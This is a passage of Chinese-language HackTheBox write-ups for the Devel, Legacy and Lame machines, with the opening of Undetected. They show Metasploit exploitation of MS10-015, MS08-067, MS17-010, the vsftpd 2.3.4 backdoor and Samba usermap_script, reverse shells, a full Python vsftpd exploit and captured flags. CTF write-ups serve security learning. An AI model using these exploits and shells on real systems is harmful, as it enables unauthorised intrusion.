vulnerable.\n[+] 10.10.10.5 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.\n[*] Post module execution completed\n```\n使用post/multi/recon/local\\_exploit\\_suggester作为提权辅助脚本\n\n这里测试出来可以使用的提权exp挺多的，我们就拿第一个吧\n\n```bash\nuse exploit/windows/local/ms10_015_kitrap0d\nset session 1\nset lhost 10.10.16.2\n```\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > show options \n\nModule options (exploit/windows/local/ms10_015_kitrap0d):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on.\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 2K SP4 - Windows 7 (x86)\n```\n设置好以后，执行\n\n```bash\nmsf6 exploit(windows/local/ms10_015_kitrap0d) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Launching notepad to host the exploit...\n[+] Process 3972 launched.\n[*] Reflectively injecting the exploit DLL into 3972...\n[*] Injecting exploit into 3972 ...\n[*] Exploit injected. Injecting payload into 3972...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.5\n[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.10.10.5:49163) at 2022-03-03 02:44:09 -0500\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : DEVEL\nOS              : Windows 7 (6.1 Build 7600).\nArchitecture    : x86\nSystem Language : el_GR\nDomain          : HTB\nLogged On Users : 2\nMeterpreter     : x86/windows\n```\n成功拿到system权限\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Users\\babis\\Desktop\\user.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\babis\\Desktop\\user.txt'\n489b24475e33a86c802d19db5fbd40e1\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\naf3b66607827cd5c2153fdbfff2a558a\n```\n成功拿到user和root权限的flag文件","tags":["Hackthebox"]},{"title":"Legacy - Hackthebox","url":"/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/","content":"\n# Hackthebox - Legacy\n## 靶场信息\n![](Hackthebox-Legacy/f5eb7547-9e3a-4cc8-842f-a2ab974ba777.png)\n\n## 靶场类型\n![](Hackthebox-Legacy/84aed2b0-7cde-457b-a81b-01aefa5b1490.png)\n\n## 信息搜集\n### Nmap\n```bash\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:06 EST\nNmap scan report for 10.10.10.4\nHost is up (0.54s latency).\nNot shown: 65532 filtered ports\nPORT     STATE  SERVICE       VERSION\n139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open   microsoft-ds  Windows XP microsoft-ds\n3389/tcp closed ms-wbt-server\nDevice type: general purpose|specialized\nRunning (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)\nOS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2\nAggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m49s, median: 4d23h57m40s\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e2:3e (VMware)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:/o:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2022-03-07T09:04:30+02:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   541.52 ms 10.10.16.1\n2   541.58 ms 10.10.10.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.31 seconds\n```\n### Samba\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Legacy]\n└─# nmap -p445 --min-rate 5000 --script=vuln 10.10.10.4                                                                                                                                                       130 ⨯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:10 EST\nNmap scan report for 10.10.10.4\nHost is up (0.24s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\nNmap done: 1 IP address (1 host up) scanned in 28.55 seconds\n```\n使用vuln插件扫描445端口的smb后发现存在两个漏洞，MS08-067和MS17-010，分别去利用一下试试\n\n## 漏洞利用\n### MS08-067\n```bash\nmsf6 exploit(windows/smb/ms08_067_netapi) > show options \n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT    445              yes       The SMB service port (TCP)\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n```\n使用指定的exp并设置好配置信息后，输入exploit执行\n\n```bash\nmsf6 exploit(windows/smb/ms08_067_netapi) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] 10.10.10.4:445 - Automatically detecting the target...\n[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...\n[*] Sending stage (175174 bytes) to 10.10.10.4\n[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.10.10.4:1032) at 2022-03-02 00:21:27 -0500\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : LEGACY\nOS              : Windows XP (5.1 Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\n成功获得system权限\n\n### MS17-010\n设置好配置后输入exploit执行\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_psexec) > show options \n\nModule options (exploit/windows/smb/ms17_010_psexec):\n\n   Name                  Current Setting                                                 Required  Description\n   ----                  ---------------                                                 --------  -----------\n   DBGTRACE              false                                                           yes       Show extra debug trace info\n   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction\n   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)\n   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   RHOSTS                10.10.10.4                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                 445                                                             yes       The Target port (TCP)\n   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing\n   SERVICE_DISPLAY_NAME                                                                  no        The service display name\n   SERVICE_NAME                                                                          no        The service name\n   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\n   SMBDomain             .                                                               no        The Windows domain to use for authentication\n   SMBPass                                                                               no        The password for the specified username\n   SMBUser                                                                               no        The username to authenticate as\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\n执行成功\n\n```bash\nmsf6 exploit(windows/smb/ms17_010_psexec) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] 10.10.10.4:445 - Target OS: Windows 5.1\n[*] 10.10.10.4:445 - Filling barrel with fish... done\n[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->\n[*] 10.10.10.4:445 -    [*] Preparing dynamite...\n[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!\n[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!\n[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel\n[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->\n[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81abb3c8\n[*] 10.10.10.4:445 - Built a write-what-where primitive...\n[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!\n[*] 10.10.10.4:445 - Selecting native target\n[*] 10.10.10.4:445 - Uploading payload... uercgOUf.exe\n[*] 10.10.10.4:445 - Created \\uercgOUf.exe...\n[+] 10.10.10.4:445 - Service started successfully...\n[*] Sending stage (175174 bytes) to 10.10.10.4\n[*] 10.10.10.4:445 - Deleting \\uercgOUf.exe...\n[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.4:1033) at 2022-03-02 00:31:20 -0500\n```\n查看一下系统信息和权限\n\n```bash\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : LEGACY\nOS              : Windows XP (5.1 Build 2600, Service Pack 3).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : HTB\nLogged On Users : 1\nMeterpreter     : x86/windows\n```\n## Flag\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Documents and Settings\\john\\Desktop\\user.txt (32 bytes)\nmeterpreter > cat 'c:\\Documents and Settings\\john\\Desktop\\user.txt'\ne69af0e4f443de7e36876fda4ec7644f\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)\nmeterpreter > cat \"c:\\Documents and Settings\\Administrator\\Desktop\\root.txt\"\n993442d258b0e0ec917cae9e695d5713\nmeterpreter >\n```\n查找并成功拿到flag文件","tags":["Hackthebox"]},{"title":"Lame - Hackthebox","url":"/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/","content":"\n# Hackthebox - Lame\n## 靶场信息\n![](Hackthebox-Lame/64e0a668-9ebf-4cfc-8c43-522c03c10081.png)\n\n## 靶场类型\n![](Hackthebox-Lame/d4ae2982-a13e-445c-b71e-58c3770f1589.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.3\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-01 00:25 EST\nNmap scan report for 10.10.10.3\nHost is up (0.51s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.16.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h30m20s, deviation: 3h32m12s, median: 17s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2022-03-01T00:26:29-05:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)                                                                                                                                                              \n|_smb2-time: Protocol negotiation failed (SMB2)                                                                                                                                                                     \n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   503.51 ms 10.10.16.1\n2   503.58 ms 10.10.10.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.36 seconds\n```\n## 漏洞利用\n### Ftp\n这边FTP的版本是vsftpd 2.3.4，我寻思可能有漏洞，去搜索一下看看\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit vsftpd 2.3.4\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这里有两个后门漏洞执行，其中一个还是msf的，去利用看看\n\n### Metasploit\n```bash\nmsf6 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n```\n咱们使用它来利用漏洞\n\n```bash\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options \n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   21               yes       The target port (TCP)\n\nPayload options (cmd/unix/interact):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3\nrhosts => 10.10.10.3\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit \n\n[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.10.3:21 - USER: 331 Please specify the password.\nwhoami\n[*] Exploit completed, but no session was created.\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > whoami\n[*] exec: whoami\n\nroot\n```\n这边确实执行成功了我们的命令，但是没有获得一个可用的shell，这并不符合我们的目的，而且我的原则一向是能不使用msf就不使用\n\n我们来看看另一个漏洞\n\n### Exploit\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit vsftpd 2.3.4\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                         | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                            | unix/remote/17491.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n┌──(root💀kali)-[~/Desktop]\n└─# locate unix/remote/49757.py\n/usr/share/exploitdb/exploits/unix/remote/49757.py\n\n\n┌──(root💀kali)-[~/Desktop]\n└─# cp /usr/share/exploitdb/exploits/unix/remote/49757.py ~/Desktop/Exploit.py\n```\n给复制到桌面，然后我们去查看一下\n\n```python\n# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution\n# Date: 9-04-2021\n# Exploit Author: HerculesRD\n# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html\n# Version: vsftpd 2.3.4\n# Tested on: debian\n# CVE : CVE-2011-2523\n\n#!/usr/bin/python3   \n\nfrom telnetlib import Telnet \nimport argparse\nfrom signal import signal, SIGINT\nfrom sys import exit\n\ndef handler(signal_received, frame):\n    # Handle any cleanup here\n    print('   [+]Exiting...')\n    exit(0)\n\nsignal(SIGINT, handler)                           \nparser=argparse.ArgumentParser()        \nparser.add_argument(\"host\", help=\"input the address of the vulnerable host\", type=str)\nargs = parser.parse_args()       \nhost = args.host                        \nportFTP = 21 #if necessary edit this line\n\nuser=\"USER nergal:)\"\npassword=\"PASS pass\"\n\ntn=Telnet(host, portFTP)\ntn.read_until(b\"(vsFTPd 2.3.4)\") #if necessary, edit this line\ntn.write(user.encode('ascii') + b\"\\n\")\ntn.read_until(b\"password.\") #if necessary, edit this line\ntn.write(password.encode('ascii') + b\"\\n\")\n\ntn2=Telnet(host, 6200)\nprint('Success, shell opened')\nprint('Send `exit` to quit shell')\ntn2.interact()\n```\n这边我尝试利用后，发现利用失败了\n\n换个其他思路看看\n\n### Samba\n```php\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Lame]\n└─# searchsploit Samba 3.0.20       \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nSamba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                            | multiple/remote/10095.txt\nSamba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                  | unix/remote/16320.rb\nSamba < 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt\nSamba < 3.0.20 - Remote Heap Overflow                                                                                                                                             | linux/remote/7701.txt\nSamba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                     | linux_x86/dos/36741.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这边也是有一个msf的脚本，先用用看吧\n\n使用msfconsole启动msf\n\n```php\nmsf6 > search Samba 3.0.20 \n\nMatching Modules\n================\n\n   #  Name                                Disclosure Date  Rank       Check  Description\n   -  ----                                ---------------  ----       -----  -----------\n   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba \"username map script\" Command Execution\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script\n\nmsf6 > use 0\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf6 exploit(multi/samba/usermap_script) > use exploit/multi/samba/usermap_script\n[*] Using configured payload cmd/unix/reverse_netcat\n```\n然后查看一下需要修改哪些配置\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > options \n\nModule options (exploit/multi/samba/usermap_script):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   139              yes       The target port (TCP)\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n```\n然后咱们开始修改\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3\nrhosts => 10.10.10.3\nmsf6 exploit(multi/samba/usermap_script) > set rport 445\nrport => 445\nmsf6 exploit(multi/samba/usermap_script) > set lhost 10.10.16.2\nlhost => 10.10.16.2\n```\n然后开始利用\n\n```php\nmsf6 exploit(multi/samba/usermap_script) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.2:4444 \n[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.10.3:45192) at 2022-03-01 01:05:18 -0500\n\nwhoami\nroot\n```\n成功拿到root权限\n\n然后输入shell进入shell控制模式\n\n```php\nroot@lame:/# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root)\n```\n```php\nroot@lame:/home/makis# cat user.txt\ncat user.txt\n7547181b7a57b001cf0ba3f497b5e8b0\n```\n在/home/makis/user.txt中找到了user权限的flag文件\n\n```php\nroot@lame:/home/makis# cd /root\ncd /root\nroot@lame:/root# ls\nls\nDesktop  reset_logs.sh  root.txt  vnc.log\nroot@lame:/root# cat root.txt\ncat root.txt\na07cd9e7c60b75852e396c4320f5fae4\n```\n在/root/root.txt中找到了root权限的flag\n\n## 其他思路\n基于可以不用自动化工具就不用的原则，咱们这里找到一个python的利用工具\n\n> [https://github.com/ozuma/CVE-2007-2447](https://github.com/ozuma/CVE-2007-2447)\n\n首先使用nc监听一个端口\n\n然后进行利用\n\n```php\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Lame]\n└─# python3 Exploit.py 10.10.10.3 445 10.10.16.2 4444\n```\n格式分别是python3 利用工具 靶机IP 靶机端口 本地IP 本地端口\n\n```php\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 43672\npython -c \"import pty;pty.spawn('/bin/bash')\"\nroot@lame:/# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root)\n```\n这样在不使用msf的情况下，也成功拿到了root权限","tags":["Hackthebox"]},{"title":"Undetected - Hackthebox","url":"/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/","content":"\n# Hackthebox - Undetected\n## 靶场信息\n![](Hackthebox-Undetected/1e25e841-82de-4cf8-8454-30c628f3334c.png)\n\n## 靶场类型\n![](Hackthebox-Undetected/c13bdf59-bb66-444b-b145-555f89b6c9d9.png)\n\n## 信息搜集\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 21:25 EST\nNmap scan report for 10.10.11.146\nHost is up (0.23s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)\n| ssh-hostkey: \n|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)\n|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)\n|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Diana's Jewelry\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/24%OT=22%CT=1%CU=42918%PV=Y%DS=2%DC=T%G=Y%TM=62183E4\nOS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=C)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505\nOS:ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=\nOS:M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=\nOS:Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q\nOS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%\nOS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD\nOS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL\nOS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   222.46 ms 10.10.14.1\n2   222.61 ms 10.10.11.146\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.48 seconds\n```\nnmap扫描后只看到22和80，那就去看看80端口吧\n\n### Http\n![](Hackthebox-Undetected/86027939-0731-489d-935c-d16b463ca98c.png)\n\n这看着像是一家珠宝店的官网，先在网站上到处看看有没有啥可以利用的东西吧\n\n点击STORE会跳转到store.djewelry.htb，加入hosts再看看\n\n```bash\necho 10.10.11.146 djewelry.htb store.djewelry.htb >> /etc/hosts\n```\n![](Hackthebox-Undetected/654e0785-e6e1-4e68-bc54-0eaf211df8c4.png)\n\n进来以后是一个商城页面，到处看看功能点\n\n![](Hackthebox-Undetected/2461efa9-d2e5-4087-9d6a-c204719d124e.png)\n\n这里提示网站已搬迁，去做个FUZZ看看\n\n### Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://store.djewelry.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          